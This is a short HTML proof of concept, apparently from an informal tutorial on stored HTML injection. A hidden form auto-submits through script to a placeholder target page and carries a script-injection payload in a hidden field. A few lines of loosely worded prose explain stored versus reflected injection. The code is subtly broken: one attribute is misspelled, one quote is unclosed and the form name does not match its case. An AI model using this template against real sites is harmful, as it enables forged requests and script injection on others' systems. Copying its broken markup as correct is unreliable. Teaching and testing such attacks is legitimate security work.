<html>
<body>
<form name="fuckForm" method="POST ction="http://publicpages.targetwebsite.com/~someuser/Php.php">
 <input type="hidden" name="input" value="<script>alert(1)
 </script>">
</form>
<script>
 document.fuckform.submit()
</script>
</body>
</html>

Single-click process. To do so, I am  creating here HTML page.

stored HTML injection is much like a reflected HTML injection. The only difference

is that the attacker places script in the web application where the script is stored to be

retrieved later  (- _ ~) 

Meanwhile server will respond.

